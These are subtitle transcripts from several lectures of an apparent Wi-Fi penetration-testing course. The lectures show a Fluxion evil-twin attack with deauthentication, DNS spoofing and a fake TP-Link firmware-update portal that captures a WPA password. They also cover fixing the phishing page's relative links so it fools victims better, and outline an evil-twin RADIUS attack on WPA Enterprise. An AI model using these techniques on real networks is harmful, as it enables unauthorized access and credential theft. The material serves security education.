00:05:52,120 --> 00:05:55,030
Automatically, now everything is running.

75
00:05:55,030 --> 00:05:59,690
We have the web server here, we have the Dhcp and the DNS servers here.

76
00:05:59,710 --> 00:06:06,310
Now we combine both the both of these and we use DNS mask instead, but they're using individual servers

77
00:06:06,310 --> 00:06:07,020
for it.

78
00:06:07,030 --> 00:06:14,080
And we also have the jammer here, which will authenticate all clients from the network so that they'll

79
00:06:14,080 --> 00:06:17,770
think that there is something wrong and connect to our evil twin.

80
00:06:19,110 --> 00:06:21,510
Okay, now I'm in my windows machine.

81
00:06:21,900 --> 00:06:24,450
Now I've actually lost my connection.

82
00:06:24,450 --> 00:06:26,490
I was connected to my proper network.

83
00:06:26,490 --> 00:06:26,760
Which.

84
00:06:26,780 --> 00:06:28,050
Which is this one.

85
00:06:28,050 --> 00:06:29,790
And this is the evil twin.

86
00:06:29,820 --> 00:06:36,480
But I actually lost my connection even though I was connected because Fluxion automatically runs at

87
00:06:36,480 --> 00:06:38,160
the authentication attack.

88
00:06:38,700 --> 00:06:45,210
So if I try to connect right now and you can see it's configured to connect automatically, but if I

89
00:06:45,240 --> 00:06:49,710
connect right now, it's just going to keep loading and it's just going to keep going on and on and

90
00:06:49,740 --> 00:06:53,010
on and on and it'll actually never let me in.

91
00:06:53,490 --> 00:07:00,060
So basically Flux Zone will automatically start the authentication attack where connected clients will

92
00:07:00,060 --> 00:07:01,230
lose their connection.

93
00:07:01,230 --> 00:07:05,610
And even if they try to connect again, they won't be able to connect.

94
00:07:06,240 --> 00:07:09,990
So hopefully they're going to think that there's something wrong with this network.

95
00:07:09,990 --> 00:07:14,730
They're going to click on Cancel and they're going to connect to the next network that has the same

96
00:07:14,730 --> 00:07:15,210
name.

97
00:07:15,210 --> 00:07:17,460
And that's my evil to a network.

98
00:07:17,460 --> 00:07:19,360
That's my fake access point.

99
00:07:19,840 --> 00:07:21,850
Now, if we connect to this.

100
00:07:24,120 --> 00:07:29,190
You'll see, I'll automatically get a login page asking me to put my password.

101
00:07:29,190 --> 00:07:34,080
But there is an issue with this page that's getting displayed automatically.

102
00:07:34,110 --> 00:07:40,350
Now I'm going to address this issue in the next lecture, but if you if you see this bar right here,

103
00:07:40,350 --> 00:07:44,940
it says that you must log in to this network before before you can access the Internet.

104
00:07:45,270 --> 00:07:48,300
If we open the login page in here.

105
00:07:49,830 --> 00:07:55,740
You'll see the login page gets displayed properly and we actually have a very nice login page.

106
00:07:55,770 --> 00:08:01,200
It's telling us that there is a firmware upgrade, so it's telling us that our router needs to be upgraded.

107
00:08:01,230 --> 00:08:06,070
It's saying there is a new version and please accept and install.

108
00:08:06,090 --> 00:08:11,610
If you look at the agreement, it looks legit and it actually says that you have a tp-link router.

109
00:08:11,610 --> 00:08:18,030
So if you know that your target uses a tp-link router from the network name or from the internet provider,

110
00:08:18,060 --> 00:08:20,280
then this looks very believable.

111
00:08:20,580 --> 00:08:25,470
Now if we also go to any other website, for example, if we go to bing.com.

112
00:08:27,540 --> 00:08:30,060
You'll see the same page being displayed properly.

113
00:08:30,060 --> 00:08:34,290
And even if we go to Facebook, you'll see it's going to ask us to log in.

114
00:08:34,290 --> 00:08:37,230
And when we click on the log in, we'll see the nice login.

115
00:08:37,350 --> 00:08:43,200
So the only problem is the page that gets loaded automatically and we'll address that later on.

116
00:08:43,230 --> 00:08:45,990
For now, let's test this and see if it works.

117
00:08:45,990 --> 00:08:49,740
So I'm going to agree with the terms and then I'm going to put my password.

118
00:08:51,750 --> 00:08:53,970
I'm going to click on the Start upgrade.

119
00:08:55,850 --> 00:09:01,460
And as you can see, you see a very nice loading bar full in the target that there is an upgrade actually

120
00:09:01,460 --> 00:09:02,930
happening in the background.

121
00:09:03,520 --> 00:09:10,060
But if we go back to the Kali machine, you'll see that we managed to get the password.

122
00:09:10,480 --> 00:09:16,810
Now, Fluxion, like I said, will actually go and check the password that the user enters against the

123
00:09:16,810 --> 00:09:22,630
handshake so it won't let the user through unless they put the right WPA key.

124
00:09:22,810 --> 00:09:27,760
So right now it went ahead and it checked that the key that the user entered is the correct key.

125
00:09:27,760 --> 00:09:33,580
And now it's telling us that the password is one, two, three, four Abcd and it check this with aircrack

126
00:09:33,580 --> 00:09:34,000
ng.

127
00:09:34,030 --> 00:09:36,820
So this is definitely the right password.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:01,340 --> 00:00:01,850
Okay.

2
00:00:01,850 --> 00:00:08,300
Now, in the previous lecture we seen how cool flexion is and how it can save us so much time.

3
00:00:08,420 --> 00:00:15,770
We also seen that it has a number of very nice templates that we can use to convince our target more

4
00:00:15,770 --> 00:00:17,180
to enter their password.

5
00:00:17,420 --> 00:00:22,430
Now the main problem was I'll show you now if I'm just going to go ahead now, I've already started

6
00:00:22,430 --> 00:00:27,800
my fake access point and I'm just going to go ahead and connect to my evil twin, which is this one.

7
00:00:28,400 --> 00:00:33,560
Now, as expected, we'll automatically see the login interface.

8
00:00:33,740 --> 00:00:36,980
The problem is the interface doesn't look good at all.

9
00:00:36,980 --> 00:00:40,100
So you can see this looks very, very suspicious.

10
00:00:40,820 --> 00:00:46,400
Now if we click on the bar and here, like I showed you in the last lecture, you'll actually get a

11
00:00:46,400 --> 00:00:50,750
nice interface where you can log in and enter your password and it looks legit.

12
00:00:50,780 --> 00:00:52,580
It looks like it's coming from Tp-link.

13
00:00:52,610 --> 00:00:57,290
It's saying that there is a firmware update and even when you start the upgrade, as we seen before,

14
00:00:57,290 --> 00:00:59,270
you see a nice loading bar.

15
00:00:59,840 --> 00:01:05,730
Now, this is the same if we open a new tab and go for bing.com for example.

16
00:01:07,110 --> 00:01:11,430
So the DNS spoofing and the Dhcp server is working properly.

17
00:01:11,670 --> 00:01:15,930
Also, if we try to go to a hsts website like Facebook.

18
00:01:18,440 --> 00:01:24,620
So again, this is being handled properly and if I log in, I'll get the nice login page that we've

19
00:01:24,620 --> 00:01:25,550
seen before.

20
00:01:25,880 --> 00:01:32,360
So the only problem that we have right now is with the page that we automatically see.

21
00:01:32,360 --> 00:01:37,550
And chances are this is the page that the user will actually enter their password because this, this

22
00:01:37,550 --> 00:01:40,370
page will be displayed to the user automatically.

23
00:01:41,220 --> 00:01:47,190
Now because we know how this works in the background, because I covered all of these steps individually

24
00:01:47,190 --> 00:01:54,150
before, we should be able to debug and see what's going wrong so we can see the fake access point is

25
00:01:54,150 --> 00:01:54,660
starting.

26
00:01:54,660 --> 00:01:56,820
So host app is working properly.

27
00:01:57,030 --> 00:02:00,600
We can see that people can connect to this network.

28
00:02:00,600 --> 00:02:04,560
So that means the Dhcp server is working properly.

29
00:02:05,040 --> 00:02:11,610
We can see any request we send is being redirected to my web server, so that means the DNS spoofing

30
00:02:11,610 --> 00:02:12,390
is working.

31
00:02:12,420 --> 00:02:17,400
Also, the web page is being displayed, so the web server is working fine.

32
00:02:17,490 --> 00:02:21,210
We can also see that Hsts is being handled properly.

33
00:02:21,210 --> 00:02:24,150
So again, the server is configured properly.

34
00:02:24,450 --> 00:02:30,990
The only thing that's not working well is whenever we have stuff coming after the name of the website.

35
00:02:31,230 --> 00:02:36,630
So if you look at all the examples where this works well, so if we look in here, you'll see that we

36
00:02:36,630 --> 00:02:39,720
just have the domain name followed by a file name, which is fine.

37
00:02:39,870 --> 00:02:43,090
If you look in here, you'll see we just have a domain name.

38
00:02:43,090 --> 00:02:46,720
And if you look in here again, you just have a domain name.

39
00:02:46,930 --> 00:02:53,170
The only time when the page is not being displayed properly is when we have a folder name or a directory

40
00:02:53,170 --> 00:02:57,010
name followed by more, more stuff or more requests.

41
00:02:57,130 --> 00:03:02,770
Now we can see we're not getting a 404 error, so we know the redirect is being handled properly as

42
00:03:02,770 --> 00:03:03,370
well.

43
00:03:03,550 --> 00:03:09,580
The only thing I can think of is if this web page is using relative URLs.

44
00:03:10,150 --> 00:03:15,910
Now, if you remember after the cloning lecture, when we were talking about captive portals, I spent

45
00:03:15,910 --> 00:03:19,060
a full lecture showing you how to download and clone a web page.

46
00:03:19,060 --> 00:03:25,720
And then I spent the next lecture talking about relative URLs and I said, If the page in here uses

47
00:03:25,720 --> 00:03:32,260
relative URLs in its code, it will try to load these URLs relative to where it is right now.

48
00:03:32,260 --> 00:03:38,800
So right now we are in a directory or the browser thinks we are in a directory called Link.

49
00:03:38,860 --> 00:03:46,090
So anything that this page uses, the browser will try to find it in a directory called F link.

50
00:03:46,420 --> 00:03:52,630
Now in our web server we don't have such directory and that's why I think this is not being loaded.

51
00:03:53,350 --> 00:03:56,770
So let's go and have a look on the code and see what happens.

52
00:03:56,770 --> 00:04:03,490
Now again, we know all of this and I was able to deduce all of this because I covered all the individual

53
00:04:03,490 --> 00:04:05,830
steps of creating the fake access point.

54
00:04:05,830 --> 00:04:11,410
So this just shows how knowing how this attack works manually will help you with fixing issues that

55
00:04:11,410 --> 00:04:14,860
you might face even in the future if you find different issues.

56
00:04:15,520 --> 00:04:23,710
So I'm going back to Cali and Flexion uses a web server called light Http, so it doesn't use Apache,

57
00:04:23,740 --> 00:04:25,840
it uses a different web server.

58
00:04:26,440 --> 00:04:33,130
Now looking at its source code, I was able to to discover or you can even guess that flux yarn stores

59
00:04:33,130 --> 00:04:35,560
all of its files in the temp directory.

60
00:04:35,650 --> 00:04:42,820
So we're going to go to files and I'm going to click on the title bar here or the Path Bar, and I'm

61
00:04:42,820 --> 00:04:43,990
going to go to Temp.

62
00:04:46,610 --> 00:04:50,450
In here, you can see we have a directory called TMP Flux.

63
00:04:50,450 --> 00:04:53,510
And this is where Flux keeps all of its files.

64
00:04:53,900 --> 00:04:58,190
So this includes the config files for all the servers that it uses.

65
00:04:58,220 --> 00:05:01,580
It includes the data that it captures and so on.

66
00:05:02,420 --> 00:05:07,210
Inside data, you'll see the files used in the web interface.

67
00:05:07,220 --> 00:05:12,560
So we have the HTML files, we have JavaScript files and styling files, CSS.

68
00:05:13,340 --> 00:05:17,090
Now the one that we're concerned with, like I said before, is the index.

69
00:05:17,090 --> 00:05:21,230
This is the one that the user see when they go to the fake web page.

70
00:05:21,560 --> 00:05:27,470
So I'm going to right click it and open it with dgeni like we always do.

71
00:05:30,430 --> 00:05:33,310
And I'm just going to zoom in in here so you can see well.

72
00:05:37,200 --> 00:05:42,930
And as you can see at the top, the first thing that we see, we can see that this page is requesting

73
00:05:42,930 --> 00:05:46,560
a file called bootstrap dot min dot CSS.

74
00:05:47,430 --> 00:05:54,060
Now, we know from looking at this that this file is in here, so it's in the same working directory.

75
00:05:55,040 --> 00:05:56,840
This will work usually.

76
00:05:56,840 --> 00:06:03,770
But if the page is being loaded like we seen in here, if there was a directory name after the domain

77
00:06:03,770 --> 00:06:12,380
name, then basically this code is saying look for bootstrap dot minix inside the directory that I am

78
00:06:12,380 --> 00:06:13,640
at at the moment.

79
00:06:13,670 --> 00:06:19,790
So in our example here, this is not going to work because it's going to look for that file inside the

80
00:06:19,790 --> 00:06:21,680
directory called F.W. Link.

81
00:06:21,680 --> 00:06:23,300
And we're not in F.W. Link.

82
00:06:23,330 --> 00:06:26,210
There's nothing called F.W. Link in my web server.

83
00:06:26,870 --> 00:06:33,090
Therefore, we'll have to modify all of the links in our web page so that they start from the web root.

84
00:06:33,110 --> 00:06:37,550
So regardless of where I was, they're not going to be relative links.

85
00:06:37,550 --> 00:06:44,990
They're not going to consider where the URL, where the current URL is, and they'll always start from

86
00:06:44,990 --> 00:06:45,680
the domain name.

87
00:06:45,680 --> 00:06:50,390
So they'll always start from go dot microsoft.com or whatever domain that's loaded.

88
00:06:50,900 --> 00:06:56,520
Now, I spent a full lecture showing how to do that before and I said, All you have to do is just put

89
00:06:56,520 --> 00:06:58,940
a forward slash before the file name.

90
00:06:58,950 --> 00:07:02,460
So all we have to do is just put a forward slash in here.

91
00:07:02,940 --> 00:07:08,850
Now, I'm not going to go manually and do this over all of the URLs that I have in this current file.

92
00:07:08,850 --> 00:07:14,220
So I'm just going to copy this and I'm going to go on search replace.

93
00:07:15,170 --> 00:07:22,190
So we're looking for href equals quotation mark and we're going to replace it with href equals quotation

94
00:07:22,190 --> 00:07:24,200
mark forward slash.

95
00:07:25,010 --> 00:07:29,600
We're going to replace this in the session and that's done.

96
00:07:30,260 --> 00:07:34,280
Now, the next thing that I want to do is modify the SRC.

97
00:07:34,370 --> 00:07:37,940
So href is a way of referencing files.

98
00:07:37,940 --> 00:07:44,660
Another way of giving files or loading files is to use the SRC argument in here.

99
00:07:45,290 --> 00:07:47,180
Now again, I'm going to copy this.

100
00:07:48,540 --> 00:07:57,300
I'm going to go to search replace, and we're looking for SRC and we're going to replace it with SRC

101
00:07:57,330 --> 00:07:59,760
equals quotation forward slash.

102
00:08:00,700 --> 00:08:04,330
Can replace this in the session and that's done as well.

103
00:08:04,870 --> 00:08:12,160
Now, when the browser loads this code, whenever it sees a forward slash before the file name, it's

104
00:08:12,160 --> 00:08:14,320
not going to consider its current location.

105
00:08:14,320 --> 00:08:16,960
So it's not going to look for this file relatively.

106
00:08:16,960 --> 00:08:18,010
It will go back.

107
00:08:18,040 --> 00:08:22,140
It will go all the way back to the web root and start looking for the file.

108
00:08:22,150 --> 00:08:27,070
So this will always work for us regardless of the way that the page is loaded.

109
00:08:27,610 --> 00:08:32,320
Now, there is one more location where we need to add a forward slash, which is the form.

110
00:08:32,770 --> 00:08:38,350
So as you remember before, we had to add the form manually to our code.

111
00:08:38,380 --> 00:08:42,090
Now, Flagstone automatically has a form in the web page.

112
00:08:42,100 --> 00:08:47,920
The only thing is, if we look at it in here, you'll see the action is looking for a file called check

113
00:08:47,920 --> 00:08:54,700
dot PHP, but check dot PHP is going to be loaded relatively to the location where the page is.

114
00:08:54,940 --> 00:09:01,340
Again, I'm just going to add a forward slash to say don't look for this relatively look for this at

115
00:09:01,340 --> 00:09:02,360
the web route.

116
00:09:03,170 --> 00:09:03,920
Now I'm done.

117
00:09:03,920 --> 00:09:06,410
I'm going to do control S to save and control.

118
00:09:06,410 --> 00:09:06,790
Quit.

119
00:09:06,800 --> 00:09:08,060
Q To quit.

120
00:09:08,060 --> 00:09:11,540
And we're ready to test this Now let's go to the Windows machine.

121
00:09:12,570 --> 00:09:13,950
I'm going to close this.

122
00:09:17,370 --> 00:09:22,860
And then I'm just going to go to my network and I'm actually going to disconnect first so that you just

123
00:09:22,860 --> 00:09:24,870
see you see the whole experience.

124
00:09:25,020 --> 00:09:27,660
So the user is going to be jumped from their network.

125
00:09:27,690 --> 00:09:29,520
They're going to come into this other network.

126
00:09:29,550 --> 00:09:31,140
They're going to click on Connect.

127
00:09:35,620 --> 00:09:40,430
And as you can see, the page that automatically gets displayed to us.

128
00:09:40,450 --> 00:09:41,490
Looks perfect.

129
00:09:41,500 --> 00:09:42,640
It looks really good.

130
00:09:42,670 --> 00:09:44,800
All the styles are loaded properly.

131
00:09:44,830 --> 00:09:47,280
It's saying that there is a firmware update.

132
00:09:47,290 --> 00:09:48,610
It looks legit.

133
00:09:48,640 --> 00:09:53,320
When the user entered their password and start the upgrade, it's going to work perfectly.

134
00:09:53,350 --> 00:09:58,150
Now, before I do that, I also want to show you if we go to the normal page that we that was working

135
00:09:58,150 --> 00:10:01,270
perfectly still works well, so we didn't affect that.

136
00:10:01,810 --> 00:10:08,770
And also if I go on a mac OS X machine, just as an example, just for a change, and let's connect

137
00:10:08,770 --> 00:10:09,790
to this network.

138
00:10:12,050 --> 00:10:17,690
And as you can see, you see a very nice login page gets displayed to you automatically.

139
00:10:18,020 --> 00:10:24,800
Now, like I said in the previous lecture, this attack looks more believable for smartphone users like

140
00:10:24,830 --> 00:10:32,530
iOS and Android and for OSX users because the login page will be displayed inside a window.

141
00:10:32,540 --> 00:10:38,780
It's not going to be shown inside the default web browser, so it just looks like it actually is a firmware

142
00:10:38,780 --> 00:10:42,410
update or that there is something wrong with the router and you need to fix it.

143
00:10:43,040 --> 00:10:47,120
Now if the user agrees and enters their password.

144
00:10:49,300 --> 00:10:52,720
They're going to start the upgrade because they want to upgrade their firmware.

145
00:10:52,930 --> 00:10:58,870
Once they do that, they'll get this very nice login loading page showing that the firmware is being

146
00:10:58,870 --> 00:11:02,590
updated and when it's done, it's actually going to say wait for a few minutes.

147
00:11:02,590 --> 00:11:10,570
But if we go back to our Kali machine, you'll see that we got the password in here and the password

148
00:11:10,600 --> 00:11:12,640
has been verified by Aircrack ng.

149
00:11:12,670 --> 00:11:15,010
So this is definitely the right password.

150
00:11:15,010 --> 00:11:18,010
So if the user puts the wrong password, they're not going to get through.

151
00:11:18,040 --> 00:11:20,830
They'll only get through if they put the right password.

152
00:11:20,830 --> 00:11:25,900
And we can see that we got the password here, which is one, two, three, four Abcd.

153
00:11:26,860 --> 00:11:32,590
Now, this issue that I showed you how to fix today will happen with all the templates that Fluxion

154
00:11:32,590 --> 00:11:33,190
uses.

155
00:11:33,190 --> 00:11:39,190
So it's not only specific to the Tp-link template, it will actually happen with all the templates.

156
00:11:39,190 --> 00:11:42,460
So you can just follow the steps that I showed you to fix it.

157
00:11:42,460 --> 00:11:48,040
And this is also a very nice example to show you that when you know what's happening in the background,

158
00:11:48,040 --> 00:11:50,810
it'll be easy for you to debug and fix it.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 8: Gaining Access - WPA & WPA2 Cracking - WPAWPA2 Enterprise

1
00:00:01,010 --> 00:00:08,690
In this lecture and in the next few lectures I'd like to talk about WPA Enterprise, what it is, how

2
00:00:08,690 --> 00:00:10,640
it works and how to hack it.

3
00:00:11,300 --> 00:00:17,570
Now, all the networks that we've seen so far in this course and in my other hacking courses, whether

4
00:00:17,570 --> 00:00:25,370
they're WPA or WPA, two networks, all of them were using a form of authentication called SK.

5
00:00:26,750 --> 00:00:29,070
SK stands for Pre-shared Key.

6
00:00:29,090 --> 00:00:36,200
And what we mean by that is there is one shared key that any device that wants to connect to the network

7
00:00:36,200 --> 00:00:39,130
can use, and they'll get access to the network.

8
00:00:39,140 --> 00:00:41,450
So there is one key in the network.

9
00:00:41,480 --> 00:00:47,040
That key is shared between all the clients, all the devices that want to connect to the network.

10
00:00:47,060 --> 00:00:52,340
And if you have that key, then you can authenticate and connect to the network.

11
00:00:52,460 --> 00:00:59,010
Now, because this is a very simple concept, the router manages the authentication in this case, because

12
00:00:59,010 --> 00:01:00,480
we only have one key.

13
00:01:00,690 --> 00:01:06,030
So whenever a client wants to connect to the network, they have to give that one specific key.

14
00:01:06,030 --> 00:01:10,830
And if that key is correct, the router will allow the client to access the network or the internet.

15
00:01:10,860 --> 00:01:15,570
If not, then they'll just refuse them and not even give them an IP address.

16
00:01:16,400 --> 00:01:21,620
Now WPA enterprise is another form of authentication.

17
00:01:21,620 --> 00:01:29,240
So we have PSK, which is Pre-shared key authentication, and we have another form of authentication

18
00:01:29,240 --> 00:01:31,730
called WPA Enterprise.

19
00:01:32,780 --> 00:01:37,650
Now, as the name suggests, it's designed for bigger and larger networks.

20
00:01:37,670 --> 00:01:44,030
It's usually used in large organizations such as big companies, universities and so on.

21
00:01:44,750 --> 00:01:52,640
The idea behind this is each user that wants to connect to the network needs to have their own username

22
00:01:52,640 --> 00:01:54,290
and their own password.

23
00:01:54,290 --> 00:01:56,150
So there is no shared key.

24
00:01:56,180 --> 00:02:00,500
Each client has to have their own key to connect to the network.

25
00:02:01,010 --> 00:02:06,140
Now this is actually a more secure implementation and it has a lot of advantages.

26
00:02:06,470 --> 00:02:13,220
First of all, it's more secure because each user will have a unique key, so their traffic will also

27
00:02:13,220 --> 00:02:15,650
be encrypted using this unique key.

28
00:02:15,800 --> 00:02:22,850
And it's more practical because if you want to deny a certain user from connecting, you won't have

29
00:02:22,850 --> 00:02:24,290
to change the one password.

30
00:02:24,290 --> 00:02:28,700
You'll just have to remove their password from the authentication server.

31
00:02:29,710 --> 00:02:36,250
Now because of this idea and this implementation, the router cannot handle this and we usually use

32
00:02:36,250 --> 00:02:39,040
a central server for authentication.

33
00:02:39,520 --> 00:02:45,640
Now the central server is very handy because we can add users and prevent users from connecting to the

34
00:02:45,640 --> 00:02:49,480
network without having to change the password for the whole network.

35
00:02:49,510 --> 00:02:56,590
So when using a pre-shared key, if we wanted to prevent a certain user or if we wanted, if we thought

36
00:02:56,590 --> 00:03:01,630
that our password got stolen, then we have to change the password and then we have to give the new

37
00:03:01,630 --> 00:03:06,370
password to all of the users that we want to allow to connect to the network.

38
00:03:06,760 --> 00:03:13,420
And the WPA enterprise case, we don't have to do that if we think a certain password is stolen or if

39
00:03:13,420 --> 00:03:18,670
we want to prevent a certain user from connecting, then we can just modify our central server, the

40
00:03:18,670 --> 00:03:24,310
radius server and remove the password that we don't want to allow on our network.

41
00:03:24,940 --> 00:03:32,000
Now, WPA Enterprise is also considered to be more secure because, like I said, each user gets their

42
00:03:32,000 --> 00:03:37,220
own key and their traffic is encrypted using their own unique key.

43
00:03:37,250 --> 00:03:43,670
Whereas in SK, in the Pre-shared key authentication, all the traffic through the network will be encrypted

44
00:03:43,670 --> 00:03:46,520
using the one single shared key.

45
00:03:46,550 --> 00:03:51,440
So regardless of the user, they'll all be using the same exact key.

46
00:03:52,580 --> 00:03:58,010
So right here I have a diagram of the way WPA Enterprise usually configured.

47
00:03:58,430 --> 00:04:02,410
Now, the access point will not be handling authentication, like I said.

48
00:04:02,420 --> 00:04:08,240
So the client is going to use some sort of authentication, usually a username and a password.

49
00:04:08,250 --> 00:04:10,580
It's going to send it to the access point.

50
00:04:10,610 --> 00:04:13,730
The access point will not do any form of verification.

51
00:04:13,730 --> 00:04:17,090
It will literally just forward that to the radius server.

52
00:04:17,390 --> 00:04:25,610
The radius server is the brain or is the entity that decides whether this form of authentication is

53
00:04:25,610 --> 00:04:26,720
correct or not.

54
00:04:26,900 --> 00:04:31,160
If the username and password are correct, it's going to tell the access point.

55
00:04:31,160 --> 00:04:32,870
Okay, these are correct.

56
00:04:32,870 --> 00:04:38,030
Allow this device to access the resource, whether it's the internet or the network.

57
00:04:38,030 --> 00:04:43,790
So the access point is going to assign an IP address to this computer and allow it to access the network.

58
00:04:44,360 --> 00:04:50,630
Therefore, when we want to add new users or prevent users from connecting, all we have to do is just

59
00:04:50,630 --> 00:04:55,620
modify our server here and remove the users that we don't want them to connect.

60
00:04:56,190 --> 00:05:04,230
Now, WPA Enterprise uses an authentication protocol called EAP, but there are other implementations

61
00:05:04,230 --> 00:05:09,180
that you might face, like Eap-fast, EAP and TLS.

62
00:05:09,510 --> 00:05:15,810
Now, I'm just trying to give you a basic understanding of what we mean by WPA enterprise and how it

63
00:05:15,810 --> 00:05:16,410
works.

64
00:05:16,410 --> 00:05:22,110
And in the next lecture we're going to discuss how we can hack this and gain access to networks that

65
00:05:22,110 --> 00:05:24,270
use this form of authentication.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,940 --> 00:00:01,510
Okay.

2
00:00:01,510 --> 00:00:09,760
So far we know WPA Enterprise is an authentication method that can be used with WPA or WPA two networks.

3
00:00:09,910 --> 00:00:19,300
So it uses encryption and in it, each user have to use their own unique username and password to authenticate

4
00:00:19,300 --> 00:00:21,250
and connect to the network.

5
00:00:21,280 --> 00:00:26,950
And we said all of this is managed using a radius or a central server.

6
00:00:27,340 --> 00:00:33,910
Now let me show you an example of a network that uses WPA enterprise just so you get an idea of how

7
00:00:33,910 --> 00:00:34,720
it works.

8
00:00:34,930 --> 00:00:37,060
So if I go to Wi-Fi here.

9
00:00:38,620 --> 00:00:42,160
You'll see that I have a network here called Company Network.

10
00:00:42,460 --> 00:00:49,620
If I try to connect to this, you'll see it won't even try to establish a connection.

11
00:00:49,630 --> 00:00:54,850
The first thing that it's going to do is it's going to ask me to enter a username and a password.

12
00:00:55,690 --> 00:01:00,250
Now the same happens here if I go to an OSX machine.

13
00:01:00,250 --> 00:01:06,870
So if I just connect to it in here, you'll see that I'm going to be asked for a username and a password.

14
00:01:06,880 --> 00:01:10,540
The only difference is the login box looks a little bit different.

15
00:01:11,510 --> 00:01:17,060
Now, if you think of the idea, it's very similar to what happens with captive portals.

16
00:01:17,060 --> 00:01:22,430
It's just implemented in a much more secure manner as shown before.

17
00:01:22,460 --> 00:01:28,850
Captive portals also ask their users to enter a username and a password, and if they're correct, they'll

18
00:01:28,850 --> 00:01:30,680
allow them to use the password.

19
00:01:30,860 --> 00:01:34,910
The only difference is captive portals are open networks.

20
00:01:34,910 --> 00:01:37,370
They do not use any encryption.

21
00:01:37,400 --> 00:01:43,850
Therefore, we were able to go in, monitor mode, sniff all the data, and if a user authenticates,

22
00:01:43,850 --> 00:01:46,790
we'll be able to capture their username and password.

23
00:01:47,000 --> 00:01:53,570
Not only that, because it's an open network, we were able to connect run an ARP spoofing attack,

24
00:01:53,570 --> 00:01:59,480
redirect the flow of packets through our computer, and that way we were able to read the usernames

25
00:01:59,480 --> 00:02:00,800
and passwords as well.

26
00:02:01,860 --> 00:02:09,510
Now, both of these methods will not work with WPA Enterprise first because, like I said, it uses

27
00:02:09,510 --> 00:02:10,320
encryption.

28
00:02:10,350 --> 00:02:16,020
Therefore, even if we go in monitor mode and sniff data, the data is going to be encrypted.

29
00:02:16,020 --> 00:02:21,540
And because we don't have the key, then we won't be able to find the passwords that's entered by the

30
00:02:21,540 --> 00:02:22,320
users.

31
00:02:23,490 --> 00:02:30,000
The other problem, because as we've seen, we can't connect to the network without having a key.

32
00:02:30,030 --> 00:02:36,450
Therefore, we can't run an ARP spoofing attack because we can only do that attack after we connect

33
00:02:36,450 --> 00:02:37,440
to the network.

34
00:02:38,070 --> 00:02:44,520
Therefore, both of these methods are useless against WPA enterprise and the only way to attack it is

35
00:02:44,520 --> 00:02:46,620
using an evil to attack.

36
00:02:47,400 --> 00:02:49,380
Now, there are two ways to do that.

37
00:02:49,380 --> 00:02:54,120
You can create a traditional evil IP, just like I showed you before.

38
00:02:54,150 --> 00:03:00,450
The only thing is you want to make sure that the login page that you automatically display to the person

39
00:03:00,450 --> 00:03:03,090
when they connect looks like a login box.

40
00:03:03,090 --> 00:03:10,680
Because with captive portals we see in by default users log in using a page, using an HTML web page.

41
00:03:10,770 --> 00:03:13,440
With this we see that in windows.

42
00:03:13,440 --> 00:03:14,910
You get you have to log in.

43
00:03:14,910 --> 00:03:19,740
In here in OSX, you get a box, a login box like this one.

44
00:03:20,250 --> 00:03:27,370
So you're going to have to fool your target to think the HTML page is what they usually use.

45
00:03:27,400 --> 00:03:28,570
With OSX.

46
00:03:28,840 --> 00:03:36,190
This might be easier because like we've seen with captive portals, OSX was still showing the HTML page

47
00:03:36,190 --> 00:03:42,040
inside the window, so you'll just have to style your fake login page a little bit to make it look like

48
00:03:42,040 --> 00:03:43,630
a system login box.

49
00:03:44,470 --> 00:03:49,990
When it comes to Windows, it's going to be a little bit more challenging because as we see in Windows

50
00:03:49,990 --> 00:03:54,160
automatically opens the login page and the default web browser.

51
00:03:54,160 --> 00:03:57,850
So the user will feel that there is something suspicious in there.

52
00:03:58,540 --> 00:04:03,160
Another problem you'll see in here, you can see that it says secured.

53
00:04:03,550 --> 00:04:11,860
Also in OSX, if you look at the network name here on the top, you'll see there is a lock beside it.

54
00:04:12,810 --> 00:04:18,660
Now, as you remember, when we were creating our fake access point, it has to be an open network so

55
00:04:18,660 --> 00:04:21,270
they can connect to it and then authenticate.

56
00:04:21,600 --> 00:04:29,460
Therefore, the traditional method of doing this is good, but it might not fool all users.

57
00:04:30,380 --> 00:04:36,410
The advantage of this method is that the user is going to send the password through the HTML form which

58
00:04:36,410 --> 00:04:42,680
is sent in our fake login page, and therefore it'll be very easy for us to capture it and read it as

59
00:04:42,680 --> 00:04:43,940
I showed you before.

60
00:04:44,850 --> 00:04:50,250
Now executing this method is identical to targeting a captive portal.

61
00:04:50,250 --> 00:04:55,710
So I covered all of these steps before in details, and therefore I'm not going to be covering it in

62
00:04:55,710 --> 00:04:56,190
here.

63
00:04:56,190 --> 00:05:01,740
I'm just simply mentioning that you can actually use that method to target this type of networks.

64
00:05:02,660 --> 00:05:07,520
What I'm going to show you, though, the next method, which is a little bit more advanced.

65
00:05:08,380 --> 00:05:10,870
Now, this is also an evil twin attack.

66
00:05:10,900 --> 00:05:17,890
We'll be also creating a fake access point, but we'll actually configure this access point to use WPA

67
00:05:17,920 --> 00:05:18,910
Enterprise.

68
00:05:19,240 --> 00:05:24,310
So when the user connects to it, they'll get a login box, a system login box.

69
00:05:24,310 --> 00:05:30,100
So in Windows they'll get something like this, an OS X, they'll get something like this.

70
00:05:30,550 --> 00:05:35,950
But once they put the password, obviously the password will be sent to us because we will be running

71
00:05:35,950 --> 00:05:42,340
the radius server, the central authentication server that I was talking about, and that way it'll

72
00:05:42,370 --> 00:05:48,520
be much easier to fool your target to connect to your network because these networks are usually used

73
00:05:48,520 --> 00:05:49,930
in large enterprises.

74
00:05:49,930 --> 00:05:55,810
So again, like I said, similar to fake access points, the users are used to connect to a number of

75
00:05:55,810 --> 00:05:59,020
routers and are used to see a number of routers around them.

76
00:05:59,020 --> 00:06:05,350
So what we'll be doing is we'll be authenticating them from their router and we'll be creating a router

77
00:06:05,350 --> 00:06:07,600
that looks identical to the router.

78
00:06:07,600 --> 00:06:11,780
It's going to have the same name, it's going to be using the exact same configuration.

79
00:06:11,780 --> 00:06:15,740
So they'll be logging in exactly the same way that they usually log in.

80
00:06:15,770 --> 00:06:19,670
Therefore, they're not going to be suspicious of the whole process.

81
00:06:20,390 --> 00:06:28,250
The only problem with this method is the data sent to us or the password is going to be encrypted and

82
00:06:28,250 --> 00:06:33,230
therefore we'll actually have to use a wordlist attack to try and crack this password.

83
00:06:33,890 --> 00:06:38,720
Now, in the next lectures, I'm going to talk in details about how to execute this attack, how to

84
